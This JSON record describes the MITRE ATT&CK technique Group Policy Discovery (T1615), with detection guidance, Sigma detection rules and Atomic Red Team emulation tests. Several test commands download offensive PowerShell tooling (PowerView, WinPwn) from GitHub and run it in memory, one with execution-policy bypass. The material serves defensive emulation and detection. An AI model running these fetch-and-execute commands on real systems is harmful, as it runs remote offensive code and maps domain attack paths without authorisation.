{
    "id": "T1615",
    "name": "Group Policy Discovery",
    "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predicable network path `<DOMAIN>SYSVOL<DOMAIN>Policies`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\nAdversaries may use commands such as `gpresult` or various publicly available PowerShell functions, such as `Get-DomainGPO` and `Get-DomainGPOLocalGroup`, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](T1484)) for their benefit.",
    "platforms": "Windows",
    "kill_chain_phases": "Discovery",
    "data_sources": "Network Traffic: Network Traffic Content, Active Directory: Active Directory Object Access, Script: Script Execution, Command: Command Execution, Process: Process Creation",
    "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\nMonitor for suspicious use of `gpresult`. Monitor for the use of PowerShell functions such as `Get-DomainGPO` and `Get-DomainGPOLocalGroup` and processes spawning with command-line arguments containing `GPOLocalGroup`.\nMonitor for abnormal LDAP queries with filters for `groupPolicyContainer` and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed.",
    "url": "https://attack.mitre.org/techniques/T1615",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "1b20efbf-8063-4fc3-a07d-b575318a301b",
                    "575dce0c-8139-4e30-9295-1ee75969f7fe",
                    "eb2fd349-ec67-4caa-9143-d79c7fb34441",
                    "c484e533-ee16-4a93-b6ac-f0ea4868b2f1",
                    "e56d3073-83ff-4021-90fe-c658e0709e72"
                ],
                "lookup_results": [
                    {
                        "uuid": "1b20efbf-8063-4fc3-a07d-b575318a301b",
                        "lookup_data": {
                            "mitre-attack-id": "T1615",
                            "mitre-cti:description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predicable network path <code>\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
                            "mitre-cti:name": "Group Policy Discovery",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Ted Samuels, Rapid7', 'Jonhnathan Ribeiro, 3CORESec, @_w0rk3r'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b', 'type': 'attack-pattern', 'created': '2021-08-06T13:10:12.916Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1615', 'url': 'https://attack.mitre.org/techniques/T1615'}, {'source_name': 'TechNet Group Policy Basics', 'url': 'https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/', 'description': 'srachui. (2012, February 13). Group Policy Basics â€“ Part 1: Understanding the Structure of a Group Policy Object. Retrieved March 5, 2019.'}, {'source_name': 'ADSecurity GPO Persistence 2016', 'url': 'https://adsecurity.org/?p=2716', 'description': 'Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence #17: Group Policy. Retrieved March 5, 2019.'}, {'source_name': 'Microsoft gpresult', 'url': 'https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult', 'description': 'Microsoft. (2017, October 16). gpresult. Retrieved August 6, 2021.'}, {'url': 'https://github.com/PowerShellEmpire/Empire', 'description': 'Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016.', 'source_name': 'Github PowerShell Empire'}], 'modified': '2021-10-15T23:16:28.296Z', 'name': 'Group Policy Discovery', 'description': 'Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predicable network path <code>\\\\<DOMAIN>\\\\SYSVOL\\\\<DOMAIN>\\\\Policies\\\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\\n\\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}], 'x_mitre_detection': 'System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\\n\\nMonitor for suspicious use of <code>gpresult</code>. Monitor for the use of PowerShell functions such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code> and processes spawning with command-line arguments containing <code>GPOLocalGroup</code>.\\n\\nMonitor for abnormal LDAP queries with filters for <code>groupPolicyContainer</code> and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed.', 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network Traffic Content', 'Command: Command Execution', 'Script: Script Execution', 'Process: Process Creation', 'Active Directory: Active Directory Object Access'], 'x_mitre_permissions_required': ['User'], 'x_mitre_is_subtechnique': False}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "575dce0c-8139-4e30-9295-1ee75969f7fe",
                        "lookup_data": {
                            "description": "Adversaries can abuse of C:\\Windows\\System32\\gatherNetworkInfo.vbs script along with cscript.exe to gather information about the target",
                            "raw": "author: blueteamer8699\ndate: 2022/01/03\ndescription: Adversaries can abuse of C:\\Windows\\System32\\gatherNetworkInfo.vbs script\n  along with cscript.exe to gather information about the target\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - cscript.exe\n    - gatherNetworkInfo.vbs\nfalsepositives:\n- Administrative activity\nfields:\n- CommandLine\n- ParentImage\nid: 575dce0c-8139-4e30-9295-1ee75969f7fe\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs\nstatus: test\ntags:\n- attack.discovery\n- attack.execution\n- attack.t1615\n- attack.t1059.005\ntitle: GatherNetworkInfo.vbs Script Usage\n",
                            "sigma:id": "575dce0c-8139-4e30-9295-1ee75969f7fe",
                            "title": "GatherNetworkInfo.vbs Script Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "eb2fd349-ec67-4caa-9143-d79c7fb34441",
                        "lookup_data": {
                            "description": "Detect use of Get-GPO to get one GPO or all the GPOs in a domain.",
                            "raw": "author: frack113\ndate: 2022/06/04\ndescription: Detect use of Get-GPO to get one GPO or all the GPOs in a domain.\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: Get-GPO\nfalsepositives:\n- Legitimate PowerShell scripts\nid: eb2fd349-ec67-4caa-9143-d79c7fb34441\nlevel: low\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md\n- https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1615\ntitle: Suspicious GPO Discovery With Get-GPO\n",
                            "sigma:id": "eb2fd349-ec67-4caa-9143-d79c7fb34441",
                            "title": "Suspicious GPO Discovery With Get-GPO",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c484e533-ee16-4a93-b6ac-f0ea4868b2f1",
                        "lookup_data": {
                            "description": "Detects the use of SharpUp, a tool for local privilege escalation",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/20\ndescription: Detects the use of SharpUp, a tool for local privilege escalation\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\SharpUp.exe\n  - Description: SharpUp\n  - CommandLine|contains:\n    - HijackablePaths\n    - UnquotedServicePath\n    - ProcessDLLHijack\n    - ModifiableServiceBinaries\n    - ModifiableScheduledTask\n    - DomainGPPPassword\n    - CachedGPPPassword\nfalsepositives:\n- Unknown\nid: c484e533-ee16-4a93-b6ac-f0ea4868b2f1\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/18\nreferences:\n- https://github.com/GhostPack/SharpUp\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.t1615\n- attack.t1569.002\n- attack.t1574.005\ntitle: SharpUp PrivEsc Tool\n",
                            "sigma:id": "c484e533-ee16-4a93-b6ac-f0ea4868b2f1",
                            "title": "SharpUp PrivEsc Tool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e56d3073-83ff-4021-90fe-c658e0709e72",
                        "lookup_data": {
                            "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
                            "raw": "author: frack113\ndate: 2022/05/01\ndescription: Detects cases in which a user uses the built-in Windows utility gpresult\n  to display the Resultant Set of Policy (RSoP) information\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - /z\n    - /v\n    Image|endswith: \\gpresult.exe\nfalsepositives:\n- Unknown\nid: e56d3073-83ff-4021-90fe-c658e0709e72\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\n- https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\n- https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1615\ntitle: Gpresult Display Group Policy Information\n",
                            "sigma:id": "e56d3073-83ff-4021-90fe-c658e0709e72",
                            "title": "Gpresult Display Group Policy Information",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1615",
                "display_name": "Group Policy Discovery",
                "atomic_tests": [
                    {
                        "name": "Display group policy information via gpresult",
                        "auto_generated_guid": "0976990f-53b1-4d3f-a185-6df5be429d3b",
                        "description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "name": "command_prompt",
                            "elevation_required": false,
                            "command": "gpresult /z\n"
                        }
                    },
                    {
                        "name": "Get-DomainGPO to display group policy information via PowerView",
                        "auto_generated_guid": "4e524c4e-0e02-49aa-8df5-93f3f7959b9f",
                        "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "WinPwn - GPOAudit",
                        "auto_generated_guid": "bc25c04b-841e-4965-855f-d1f645d7ab73",
                        "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPOAudit -noninteractive -consoleoutput",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "WinPwn - GPORemoteAccessPolicy",
                        "auto_generated_guid": "7230d01a-0a72-4bd5-9d7f-c6d472bc6a59",
                        "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPORemoteAccessPolicy -consoleoutput -noninteractive",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "MSFT Get-GPO Cmdlet",
                        "auto_generated_guid": "52778a8f-a10b-41a4-9eae-52ddb74072bf",
                        "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "gpo_output": {
                                "description": "The output of the Get-GPO cmdlet",
                                "type": "string",
                                "default": "$env:temp\\GPO_Output.txt"
                            },
                            "gpo_param": {
                                "description": "You can specify a GPO by its display name or by its globally unique identifier (GUID) to get a single GPO, or you can get all the GPOs in the domain through the All parameter",
                                "type": "string",
                                "default": "-All"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Add Rsat.ActiveDirectory.DS",
                                "prereq_command": "if(Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }",
                                "get_prereq_command": "Add-WindowsCapability -online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
                            },
                            {
                                "description": "Add Rsat.GroupPolicy.Management.Tools ###Two RSAT Modules needed for this to work on Win10, WinServer 2019 works by default. This will take a long time (almost 2 minutes) to install RSAT Manually###.",
                                "prereq_command": "if(Get-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }",
                                "get_prereq_command": "Add-WindowsCapability -online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0"
                            }
                        ],
                        "executor": {
                            "command": "Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}",
                            "cleanup_command": "del $env:temp\\GPO_Output.txt -erroraction silentlycontinue",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 19:07:26"
}